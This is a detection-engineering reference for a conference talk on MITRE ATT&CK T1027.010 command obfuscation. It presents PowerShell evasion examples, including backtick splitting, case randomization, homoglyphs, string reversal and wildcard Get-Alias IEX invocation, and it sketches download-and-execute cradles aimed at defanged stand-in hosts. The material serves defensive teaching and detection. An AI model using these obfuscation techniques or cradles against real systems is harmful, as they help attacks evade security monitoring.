# T1027.010 — Command Obfuscation: Technical Reference

**Section:** Talk Section 3 (4 min stage time) — "T1027.010: Command Obfuscation"
**Purpose:** Ground-truth technical manual on the technique itself: what it says, what it
covers, what changed for defenders when it was added, and deep-dive treatment of the two
subsystems the speaker wants covered in depth — character masking and the wildcard IEX
invocation pattern.

All ATT&CK quotes below are sourced live from `attack.mitre.org` on 2026-08-11 — see
the live T1027.010 and T1027 pages directly for the primary source.
All code in this document is synthetic, written for teaching detection engineering, and
contains no live infrastructure, no real C2, and no working weaponized payload.

---

## 1. Official technique definition and scope

**MITRE ATT&CK ID:** T1027.010
**Name:** Obfuscated Files or Information: **Command Obfuscation**
**Tactic:** Stealth (TA0005) — this is the live page's current label for TA0005 as of
this fetch; audiences who know TA0005 by its longer-standing colloquial name, "Defense
Evasion," should read the two as the same tactic. Don't state "Defense Evasion" on stage
as if it's what the page itself currently says — it isn't.
**Platforms:** Linux, macOS, Windows
**Sub-technique of:** T1027 (Obfuscated Files or Information)
**Created:** 14 March 2023 · **Version:** 2.0 · **Last Modified:** 12 May 2026
**Contributors (per the live page):** George Thomas; **Tim Peck**; TruKno

The technique's own summary line is unambiguous about what it is scoped to:

> "Command-line obfuscation is a method of making strings and patterns within commands
> and scripts more difficult to signature and analyze."

That's the whole scope in one sentence: **the command line and script text itself** — not
the payload it eventually delivers, not the file format it's stored in. T1027.010 is
about the layer of obfuscation an analyst, an EDR signature, or a SOC engineer sees the
instant a process executes or a script block is logged — the literal characters typed (or
generated) at invocation time.

The technique text goes on to enumerate the specific obfuscation mechanics it covers.
This is worth reading as a checklist, because it's effectively the taxonomy the rest of
this guide (and the talk) hangs off of:

- **Syntactic manipulation** — adversaries abuse "various symbols and escape characters
  (such as spacing, `^`, `+`, `$`, and `%`) to make commands difficult to analyze while
  maintaining the same intended functionality."
- **Encoding methods** — "Many languages support built-in obfuscation in the form of
  base64 or URL encoding."
- **String manipulation** — manual techniques including "string splitting
  (`"Wor"+"d.Application"`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`),
  globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings
  through tokens/environment variables/input streams." (A round-3 critique caught an
  earlier draft of this quote silently dropping the page's two worked examples for
  "order and casing of characters" and "globing" — joining those two terms directly to
  each other and to the surrounding clauses as if the example-free version were the
  original sentence, with no ellipsis marking the excision. Fixed here to the full
  sentence, all three worked examples intact, exactly as the live page presents them.)
- **Path obfuscation** — "directory traversals to obfuscate references to the binary
  being invoked by a command."
- **Automated tooling** — the page's own sentence, quoted exactly (the live page spells
  the second tool without an "s," as "Invoke-DOSfucation," likely a page-side typo; this
  guide keeps the corrected spelling in prose elsewhere but preserves the original here
  since it's inside a direct quote): "Tools such as Invoke-Obfuscation and
  Invoke-DOSfucation have also been used to obfuscate commands." (A round-2 critique
  caught an earlier draft paraphrasing this as "facilitate command obfuscation" inside
  quotation marks, as if that were MITRE's own phrase — it wasn't; fixed here to the
  actual sentence.)

Every one of those five bullets maps to something demonstrated live in STEEP#MAVERICK's
eight-layer chain (covered in Section 2 of the talk / `guides/01-*`). That mapping is not
a coincidence — it's the throughline of this whole section: a real campaign supplied real
examples of a gap that didn't have a name yet.

---

## 2. Relationship to parent T1027

**T1027 — Obfuscated Files or Information** is the broad, Stealth-tactic (TA0005)
technique the live page describes, quoted exactly and in full rather than trimmed, as:
"Adversaries may attempt to make an executable or file difficult to discover or analyze
by encrypting, encoding, or otherwise obfuscating its contents on the system or in
transit." (A round-2 critique caught an earlier draft of this blockquote silently
dropping "otherwise," silently changing "the system" to "systems," and silently
pluralizing "an executable or file" to "executables or files" — none bracketed or
flagged. Fixed here to the page's exact wording, unedited.) Its own description frames
the parent as covering the *artifact* layer — payloads, files, and content at rest or in
transit — while explicitly carving out command obfuscation as a related but distinct
concern.

The paragraph below paraphrases several non-adjacent sentences from the live T1027 page
rather than presenting them as one continuous quotation (an earlier draft of this guide
spliced them together in a way that read as a single verbatim quote — that was wrong and
has been corrected here). What the page actually says — three separate exact quotes, not
one continuous quotation: payloads are "compressed, archived, or encrypted" (in order to
avoid detection). Separately: "Sometimes a user's action may be required to open and
Deobfuscate/Decode Files or Information for User Execution." (A round-2 critique caught
an earlier draft of this sentence quoting "requiring a user to perform a specific
action" as if it were verbatim — it wasn't; that phrase appears nowhere on the live page
and has been replaced here with the page's actual sentence.) And separately, adversaries
"abuse Command Obfuscation to obscure commands executed from payloads or directly via
Command and Scripting Interpreter," where — this fragment is the load-bearing one for
this section — "environment variables, aliases, characters, and other platform/language
specific semantics can be used to evade signature based detections."

That last, directly-quoted fragment — command-level obfuscation via environment
variables, aliases, characters, and language semantics — is precisely what got carved out
into its own sub-technique. Note that this "aliases" language lives on the **parent**
T1027 page, not on T1027.010's own page — see the scoping note at the top of §3 before
treating "aliases" as something T1027.010 itself names. T1027 is the umbrella; T1027.010
is one of **18 sub-techniques** under it
(alongside things like Software Packing, Steganography, HTML Smuggling, and Invisible
Unicode), and is the one specifically scoped to *command-line and script-text*
obfuscation rather than binary/file obfuscation.

**Practical distinction for detection engineers:**

| | T1027 (parent) | T1027.010 (this sub-technique) |
|---|---|---|
| Unit of analysis | Files, binaries, payloads | Commands, script text, invocation strings |
| Example | A packed/encrypted PE, a steganographic image payload | `Get-C*d -N I*-E* \| iex $(-join(97,98,99\|%{[char]$_}))` |
| Where it's observed | Disk, network transfer, memory | Command line (4688/Sysmon EID 1), PowerShell script block (4104), shell history |
| Defeats | Static file signatures, AV hashing | Regex/string-match command-line signatures |

Rules built for T1027.010 should be scoped to command-line and script-block content;
rules built for generic T1027 coverage (entropy on files, packer detection, etc.) will
not catch the pattern this section covers, and vice versa. That distinction is exactly
why coarse T1027 coverage wasn't enough — see §4.

---

## 3. This guide's manipulation taxonomy — a teaching synthesis, not MITRE's own labels

**Scoping note, stated plainly up front:** the five-category breakdown below is **this
guide's own synthesis**, built for detection-engineering teaching purposes — it is
**not** a taxonomy MITRE names verbatim on the T1027.010 page. Specifically:

- The words **"alias"/"aliases" never appear on the live T1027.010 page** — the term
  only appears on the *parent* T1027 page's language (quoted in §2: "environment
  variables, aliases, characters, and other platform/language specific semantics").
- The word **"wildcard" does not appear on either page.** T1027.010's actual, closest
  term is **"globing,"** used once on the page (in an example unrelated to alias/command
  resolution). "Wildcards" below is this guide's own interpretive label for what globing
  covers in a PowerShell alias/command-resolution context — not MITRE's word.
- "String concatenation" is this guide's near-synonym for T1027.010's actual term,
  **"string splitting."**
- "Environment variables" and "special characters" (as a paraphrase of T1027.010's
  "symbols and escape characters") are the two categories closest to the page's literal
  wording.

With that labeled honestly, this is the working taxonomy `detection/` rules and the
tooling CLI in this project are built against:

1. **Aliases** *(sourced from the parent T1027 page, not T1027.010 itself — see above)*
   — invoking a cmdlet or binary by a shortened/alternate name registered in the shell
   (e.g., PowerShell's `iex` for `Invoke-Expression`, `gcm` for `Get-Command`) so the
   canonical, commonly-signatured name never appears in the command line.
2. **Wildcards / globing** *(this guide's read of T1027.010's actual term, "globing")*
   — using glob/wildcard expansion against alias or command tables to *resolve* a cmdlet
   at runtime instead of naming it directly (the centerpiece of §6 below).
3. **Environment variables** *(T1027.010's own language: "tokens/environment
   variables/input streams")* — building command strings by concatenating or expanding
   environment variables (`$env:`, `%VAR%`) so the literal target string never appears
   verbatim in the invoking command.
4. **String concatenation** *(T1027.010's own term is "string splitting" — used as a
   near-synonym here)* — splitting a string into fragments and rejoining them at
   execution time (`"Wor"+"d.Application"` is MITRE's own example), defeating any
   signature written against the whole string.
5. **Special characters to defeat pattern matching** *(paraphrase of T1027.010's
   "symbols and escape characters")* — escape characters, carets, plus signs, backticks,
   percent signs, and spacing inserted specifically to break regex and substring
   signatures while leaving the parser's interpretation unchanged.

These five categories are not independent — real-world samples (STEEP#MAVERICK included)
typically stack several of them, which is why the technique's own text calls out
automated obfuscation frameworks (`Invoke-Obfuscation`, `Invoke-DOSfuscation`) as the
tooling that industrializes stacking these primitives.

---

## 4. Before T1027.010 existed vs. after — what changed for defenders

This is the framing the talk needs to land in this section: the technique didn't create
new attacker behavior. Adversaries had been aliasing, wildcarding, concatenating, and
escape-character-mangling commands for years before March 2023. What changed is what
defenders could point at.

**Before (pre–14 March 2023, T1027 only):**
- Command-level obfuscation had **no dedicated ATT&CK ID**. The only home for it was the
  broad T1027 parent, which is scoped around files/payloads, not command-line text.
- Detection content built against "T1027" as a mapping was ambiguous — a rule that
  flagged Base64-decoded PowerShell and a rule that flagged a packed binary were both
  "T1027 coverage," with no way to distinguish command-string obfuscation gaps from
  payload obfuscation gaps in a coverage matrix (ATT&CK Navigator heatmap, detection gap
  analysis, purple-team scoping).
- There was no framework-anchored vocabulary for reporting a novel command-obfuscation
  primitive — like the wildcard IEX pattern found in STEEP#MAVERICK — other than
  describing it in prose and mapping it, imprecisely, to the T1027 umbrella.
- Detection engineers writing signatures for "obfuscated PowerShell" had to invent their
  own internal taxonomy of what "obfuscated" meant, with no shared reference point across
  teams or vendors.

**After (14 March 2023 onward, T1027.010 exists):**
- Command obfuscation has a **first-class ATT&CK ID** distinct from file/payload
  obfuscation, with its own detection strategy (**DET0505**) and three published
  analytics (**AN1394**, **AN1395**, **AN1396** — see §7 for exact text).
- Coverage mapping is precise: a Sigma rule, a Splunk correlation search, or a Navigator
  layer can now say "this rule covers T1027.010" and mean something specific —
  command-line syntactic obfuscation — separable from "this rule covers T1027.001"
  (Binary Padding) or T1027.013 (Encrypted/Encoded File).
- The technique gives detection engineering an **anchor point** for exactly the class of
  novel finding STEEP#MAVERICK produced: a wildcard alias-resolution invocation pattern
  now maps cleanly onto §3's taxonomy — itself grounded in T1027.010's actual wording
  around globing, environment-variable/token tricks, and escape-character abuse, plus the
  parent T1027 page's "aliases" language — instead of needing a bespoke writeup to
  justify why it's obfuscation at all.
- Threat intel and detection teams get a shared vocabulary: "T1027.010 behavioral
  indicators" is now a phrase that means the same thing across a SOC, a vendor report,
  and an ATT&CK Navigator heatmap — which is exactly what Section 6 of this talk (the
  live demo) depends on when it maps rules "explicitly to T1027.010 and parent T1027."

The one-line version for the slide: **before, "obfuscated PowerShell" was a description;
after, it's a coverage target.**

---

## 5. Character masking — dedicated technical subsection

The speaker has asked for explicit, code-level coverage of **character masking**: the
family of T1027.010 techniques that manipulate the *visual and lexical* representation of
a command — not its logic — specifically to defeat string- and regex-based pattern
matching. This maps directly to the technique's "syntactic manipulation" and "string
manipulation" language quoted in §1 (special characters, order/casing of characters).

> One-line in-community nod: this class of technique — backtick splitting, case
> randomization, and friends — is one John Hammond has also covered publicly. Audience
> will get the reference; no further explanation needed on stage.

All examples below are synthetic teaching payloads. They resolve to an inert,
no-op-equivalent action (`Write-Host` / string echo) rather than a live download cradle,
so they are safe to paste into a lab shell to demonstrate detection logic. Any resemblance
to a live download cradle is illustrated with fully defanged placeholders
(`hxxp://pkg-update-cdn[.]test`).

### 5a. Backtick splitting

PowerShell treats the backtick (`` ` ``) as its escape character, and — critically — a
backtick placed *inside* a cmdlet or parameter name is simply consumed by the parser and
does not appear in the resolved token. This lets an adversary interleave backticks
through a sensitive string so no contiguous substring signature matches, while the parser
reassembles the intended token at parse time.

```powershell
# Intent: Invoke-Expression, split with backticks to defeat a substring match on
# "Invoke-Expression" / "IEX"
I`n`v`o`k`e`-`E`x`p`r`e`s`s`i`o`n "Write-Host 'synthetic payload executed'"

# Same trick against a cmdlet name used to reach the network in a download cradle
# (defanged placeholder URI — do not use a live host)
Invoke`-`WebRequest -Uri "hxxp://pkg-update-cdn[.]test/stage2.ps1"
```

Detection note: backtick density inside a single token, or a token that only resolves to
a known cmdlet name *after* backtick-stripping, is a strong T1027.010 indicator — see the
AN1394 "excessive escape characters" analytic in §7.

### 5b. Case randomization

PowerShell's parser is case-insensitive for cmdlet and parameter names. Randomizing
case produces a token that is functionally identical to the canonical cmdlet but will not
match a case-sensitive (or naively-cased) string signature.

```powershell
# Functionally identical to Invoke-Expression, cased to dodge a literal-string signature
InVoKe-ExPrEsSiOn "wRiTe-HoSt 'synthetic payload executed'"

# Same trick applied to an encoded-command invocation
pOwErShElL.exe -NoP -w hidden -EnCoDeDcOmMaNd <base64-placeholder-blob>
```

Detection note: case randomization alone doesn't defeat case-insensitive regex, but it
reliably defeats simplistic `-clike`/`-ceq`/hash-based literal matching, and is a strong
signal when *combined* with other masking (backticks, splitting) because legitimate
scripts rarely randomize case by hand.

### 5c. Unicode homoglyphs

Substituting a Latin character for a visually-identical (or near-identical) character
from another Unicode block. The rendered/eyeballed command looks correct to a human
reviewer or a screenshot-based triage, but the underlying byte sequence — and therefore
any exact-string or hash-based signature — does not match.

```powershell
# The 'e' in "Invoke" below is U+0435 (CYRILLIC SMALL LETTER IE), not U+0065 (LATIN 'e').
# This example will NOT execute as-is (Cyrillic 'е' breaks the cmdlet name and throws a
# CommandNotFoundException) -- it is shown purely to illustrate visual masking, which is
# the point of a homoglyph attack in the first place: it survives a human eyeball-review
# of a script or a screenshot far better than it survives an actual parser or an
# encoding-aware string comparison.
Invok​е-Expression "Write-Host 'synthetic payload executed'"   # 'е' = U+0435

# A more realistic operational variant: homoglyphs substituted into a STRING ARGUMENT
# (e.g., a decoy domain or filename) rather than the cmdlet name itself, since the
# cmdlet must remain byte-exact to actually resolve and run.
Invoke-WebRequest -Uri "hxxp://miсrosoft-updates[.]test/patch.ps1"  # 'с' = U+0441 Cyrillic
```

Detection note: homoglyph masking is best caught by flagging any command-line token that
mixes Unicode scripts — a legitimate PowerShell invocation should be pure Basic Latin, so
a single Cyrillic or Greek code point inside an otherwise-Latin cmdlet name or hostname is
a strong signal on its own. **Do not rely on NFKC normalization for this** — an earlier
draft of this guide recommended NFKC-folding, which is wrong: NFKC (compatibility
composition) only folds compatibility variants of the *same* character (full-width to
normal-width, ligature decomposition, etc.); it does not map cross-script confusables like
Cyrillic `е` (U+0435) onto Latin `e` (U+0065) — those are different characters in
different Unicode blocks, not compatibility equivalents. The correct mechanism is Unicode
confusables/skeleton detection per **UTS #39** (the Unicode Consortium's confusables
table), the same approach browsers use for IDN homograph phishing detection — feed each
token through a confusables-skeleton function and compare the skeleton to the expected
cmdlet/hostname rather than the raw string.

### 5d. String reordering / reversal

Building the target string in reverse (or out of order) and reassembling it at runtime —
via `[char[]]::Reverse()`, indexed array joins, or `-join` — so the literal target
substring never appears anywhere in the command line as typed.

```powershell
# Reversed string reconstruction — "Invoke-Expression" never appears literally
$s = 'noisserpxE-ekovnI'
$cmd = -join ($s.ToCharArray() | ForEach-Object { $_ })[($s.Length-1)..0]
& $cmd "Write-Host 'synthetic payload executed'"

# Character-array reordering via explicit index list (out-of-order, not simple reversal).
# $chars is 'Invoke-Expression' with its 17 characters sorted into ascending character-code
# order (not reversed, not typed contiguously); $order is the index permutation that reads
# them back out in the correct sequence. Hand-verified: chars[order[0..16]] reconstructs
# "Invoke-Expression" exactly -- do not reuse the previous draft's index list, it was wrong.
$chars = '-EIeeiknnooprssvx'.ToCharArray()
$order = 2,7,15,9,6,3,0,1,16,11,12,4,13,14,5,10,8
$cmd = -join ($order | ForEach-Object { $chars[$_] })
& $cmd "Write-Host 'synthetic payload executed'"
```

Detection note: this variant is largely invisible to static string/regex signatures by
design — the reconstructed string only exists in memory at execution time. This is
precisely why T1027.010 coverage depends on **execution-time** telemetry (PowerShell
Script Block Logging, Event ID 4104) rather than static command-line matching alone; the
*deobfuscated* content that 4104 captures at invocation time is often the only place the
real target string ever appears in a log. This is the direct bridge to Section 5 of the
talk (The Telemetry Problem).

### 5e. Format-string reconstruction — and the index-reordering trap

PowerShell's format operator assembles a string from a template plus an argument list.
As an obfuscation primitive it behaves like concatenation, with one important wrinkle
that routinely defeats tooling.

```powershell
# Straightforward: arguments in the same order as the placeholders
("{0}{1}" -f 'IE','X')          # -> IEX

# The variant that matters: INDEX-REORDERED
("{1}{0}" -f 'EX','I')          # -> IEX, NOT 'EXI'
```

Reading the arguments left to right spells `EXI`. Only the `{1}{0}` placeholder order
rebuilds `IEX`. **Any analyzer that concatenates `-f` arguments in argument order and
ignores the placeholders will reconstruct the wrong string and silently fail to match.**
This repo's own `t1027010_hunter.py` had exactly that bug until it was found by testing
the tool against the talk's own slides — it now parses the `{N}` order first and
reassembles accordingly. If you are writing your own reconstruction logic, this is the
single easiest thing to get wrong.

Detection shape: a quoted template containing `{N}` placeholders, a `-f` operator, and a
comma-separated literal list, with the result reaching a call operator.

---

## 6. The wildcard IEX invocation pattern — dedicated technical subsection

This is the direct link between STEEP#MAVERICK and the T1027.010 submission, and the
centerpiece novel finding referenced in the talk abstract. **Honesty check on that
"direct link" claim:** the causal chain — this specific research finding fed this
specific technique submission — is the speaker's own firsthand account, not something the
public ATT&CK page states outright. What the live page *does* corroborate is
circumstantial but real: T1027.010 was created 14 March 2023, and Tim Peck is listed
among its contributors today. The page does not name STEEP#MAVERICK, the wildcard-IEX
pattern, or any specific research finding anywhere in its text. Treat this section's
"mapped cleanly onto the definition" argument (§6b) as this guide's own analysis of *why*
the pattern fits the technique, not as a claim MITRE itself makes about that history.

The full campaign narrative (delivery chain, all eight obfuscation layers,
counter-forensics) lives in the companion document (`guides/01-*`, the STEEP#MAVERICK
deep-dive) — this section stays narrowly focused on **the mechanics of the pattern and
how it maps onto T1027.010's own words.**

### 6a. The mechanic

PowerShell's `Get-Alias` and `Get-Command` both accept `-Name` (or positional) arguments
that support wildcard expansion, and both **return the resolved command object**, not
just a name. That resolved object can be piped directly into an invocation operator
(`&`, `.`) — meaning an adversary can wildcard-match their way to `Invoke-Expression` or
`Invoke-RestMethod` and invoke it **without the literal cmdlet name ever appearing in the
command line.**

```powershell
# Synthetic reconstruction of the pattern class — resolves and invokes Invoke-Expression
# via wildcard alias lookup. "iex" (the built-in alias) never appears as a literal token;
# neither does "Invoke-Expression".
& (Get-Alias i*x) "Write-Host 'synthetic payload executed'"

# Get-Command variant, wildcarding the verb-noun pattern instead of the alias table
& (Get-Command Invoke-Exp*ssion) "Write-Host 'synthetic payload executed'"

# Chained into a (defanged, synthetic) download-and-execute cradle -- the shape of the
# pattern as it would appear feeding a staged payload
& (Get-Alias i*x) (New-Object Net.WebClient).DownloadString('hxxp://pkg-update-cdn[.]test/stage.ps1')

# Invoke-RestMethod variant -- irm resolved the same way
& (Get-Command Invoke-RestM*) -Uri 'hxxp://pkg-update-cdn[.]test/stage.ps1'
```

The core trick generalizes: **any** cmdlet reachable via a unique-enough wildcard against
the alias table or the command table can be resolved and invoked this way, with the
literal name of the dangerous cmdlet never typed. `iex`/`Invoke-Expression` and
`irm`/`Invoke-RestMethod` are the highest-value targets because they're the two most
commonly signatured "execute untrusted content" primitives in PowerShell — which is
exactly why a pattern that resolves them indirectly defeats a huge fraction of
naive command-line detection content in one move.

### 6b. Why it mapped cleanly onto T1027.010's definition

Walk this guide's taxonomy (§3, itself grounded in the exact T1027.010/T1027 quotes in
§1/§2) against this pattern and the fit is direct, not a stretch — but note this table's
left column is **this guide's synthesis**, not a table of MITRE's own category labels
(see the scoping note at the top of §3):

| Manipulation category (this guide's taxonomy, §3) | How the wildcard IEX pattern instantiates it |
|---|---|
| **Aliases** *(parent-page language, not T1027.010's own text)* | `Get-Alias` resolution targets PowerShell's built-in alias table (`iex`, `irm`, etc.) directly — this is the same alias-abuse concept the parent T1027 page names. |
| **Wildcards / globing** *(this guide's read of T1027.010's actual term, "globing")* | The `-Name` argument to `Get-Alias`/`Get-Command` is wildcard-matched (`i*x`, `Invoke-Exp*ssion`) rather than typed exactly — mapped here to T1027.010's "globing" language, though the page's own use of that word is in an unrelated bash example, not a wildcard-alias-resolution example. |
| **Special characters to defeat pattern matching** *(paraphrase of T1027.010's "symbols and escape characters")* | The `&`/call operator plus parenthesized subexpression syntax is itself a structural obfuscation of the invocation site — no signature written against `iex ` or `Invoke-Expression ` (as literal, contiguous strings) will match. |
| **String manipulation / order and casing** *(T1027.010's own language)* | Wildcard patterns can additionally be cased or fragmented (`i*X`, `In*-Exp*`) stacking with §5's masking techniques. |

That mapping is the technical crux of the origin story, told honestly: at the time
STEEP#MAVERICK research documented this pattern, there was no ATT&CK sub-technique whose
*definition* this pattern satisfied so completely — the pattern is essentially a worked
example of alias-table abuse, wildcard/glob-based resolution, and pattern-matching
evasion, three categories in this guide's own taxonomy, each traceable to either
T1027.010's actual wording or the parent T1027 page's language, executing simultaneously
in one invocation. T1027 alone was too coarse to make that claim precisely; T1027.010's
language, once it existed, fit the pattern well — that's this guide's argument about the
fit, not a connection MITRE's page draws explicitly (see the honesty check at the top of
this section).

### 6c. Detection implication

Because the dangerous cmdlet name never appears literally, command-line string/regex
signatures targeting `Invoke-Expression` or `iex` as tokens **do not fire** on this
pattern. Effective detection instead has to key on the *behavioral* shape:

- `Get-Alias` or `Get-Command` invoked with a wildcard argument, immediately followed by
  (or piped into) an invocation operator (`&`, `.`) or `Invoke-Command`.
- The wildcard pattern itself matching known high-value targets (`i*x`, `*Expression`,
  `*RestMethod`, `*WebRequest`) — a candidate high-signal Sigma condition.
- Cross-referencing PowerShell Script Block Logging (4104) content, since 4104 captures
  the deobfuscated/resolved form and can reveal what the wildcard actually resolved to at
  runtime, even when the invoking command line alone is ambiguous.

This is the exact detection logic built out in `detection/` and demonstrated live in
Section 6 of the talk, mapped explicitly to T1027.010 (and to parent T1027 for coverage
matrix completeness).

### 6d. Path-derived character harvesting

A further step out from both families above. Rather than masking a literal (§5) or
resolving a name from the alias table (§6a), this sources the characters from somewhere
outside the script entirely — most commonly a filesystem path produced by a *wildcard*
path resolution — and indexes specific offsets out of the resulting string.

```powershell
# Shape of the pattern (synthetic; real offsets are host-specific).
# A wildcard Resolve-Path yields some System32 path, then three fixed character
# offsets are plucked out of it and joined into the command name.
.((rvpa "\???????\*2\*POO*\*river?\?6*").Path[4,15,34] -join '')
```

Why it is the hardest of the three families to reason about:

- **The target never appears, in any form, anywhere in the script.** §5 techniques at
  least embed the characters; §6a at least names the alias table. Here the characters
  come from the filesystem.
- **There is no enumerable source.** A path, a date string, an environment variable, the
  contents of a file — anything with stable characters at known offsets will do. You
  cannot write a list of sources to watch.
- **Offsets are host-specific**, so no two samples look alike even using the same trick.

What *is* stable is the shape: a multi-element integer index list applied to a string
(frequently a `.Path`/`.FullName`/`.Name` property), joined, with the result reaching a
call operator. That is what `t1027010_hunter.py` keys on, graded by whether the source
is a resolved path and whether the result is actually invoked.

**This is the cleanest single argument for Event ID 4104 in the whole talk.** Static
analysis of the script text cannot recover the target here, even in principle, because
the target is not in the text. Script Block Logging captures the resolved form at
invocation, after the harvest has already happened — so the thing you cannot derive
statically is simply handed to you by the engine.

---

## 7. Detection engineering anchor: the technique's own detection strategy

T1027.010 ships with a published detection strategy, useful as the framework-level anchor
for why "detection engineering is only as viable as the fuel you give it" (the talk's
closing line) is true specifically for this technique:

**Detection Strategy DET0505** — "Detection Strategy for Command Obfuscation," composed
of three analytics:

- **AN1394** — "Detection of command-line activity exhibiting syntactic obfuscation
  patterns, such as excessive escape characters, base64 encoding, command concatenation,
  or outlier command length and entropy."
- **AN1395** — "Detection of shell commands that leverage encoded execution, command
  chaining, excessive piping, or unusual token patterns indicative of obfuscation."
- **AN1396** — "Detection of obfuscated commands via shell, osascript, or AppleScript
  interpreters using unusual tokens, encoding, variable substitution, or runtime string
  reconstruction."

Note what all three analytics have in common: **every one of them requires visibility
into the actual command-line or script-block content**, not just the fact that a process
executed. None of AN1394–AN1396 are satisfiable from a process-creation event with a
truncated or absent command line. That's the technical justification, straight from
MITRE's own detection strategy, for why Section 5 of the talk (The Telemetry Problem) —
Script Block Logging 4104, Module Logging 4103, and Sysmon EIDs 1/7/17 — isn't a
generic "turn on more logging" platitude. It's the specific, named prerequisite for every
analytic this technique publishes.

Relevant mitigations listed on the technique page: **M1049 (Antivirus/Antimalware)** —
specifically calling out AMSI on Windows 10+ to analyze processed commands — and
**M1040 (Behavior Prevention on Endpoint)** — Attack Surface Reduction (ASR) rules that
can block execution of potentially obfuscated scripts.

---

## 8. Speaker credibility note

The live T1027.010 technique page lists **Tim Peck** among its contributors (alongside
George Thomas and TruKno), corroborating the talk's credibility framing that this
section is delivered by one of the researchers who contributed to the technique's
submission — not a secondhand retelling. The specific causal narrative — that
STEEP#MAVERICK's wildcard-IEX finding directly motivated the submission — is the
speaker's own firsthand account (see the honesty check at the top of §6); the ATT&CK
page itself confirms the contributor credit and the creation date, not the story
connecting them.

---

## Sources

Primary sources: MITRE ATT&CK T1027.010 (attack.mitre.org/techniques/T1027/010/) and
its parent T1027 (attack.mitre.org/techniques/T1027/), both fetched live and quoted
directly throughout this document.
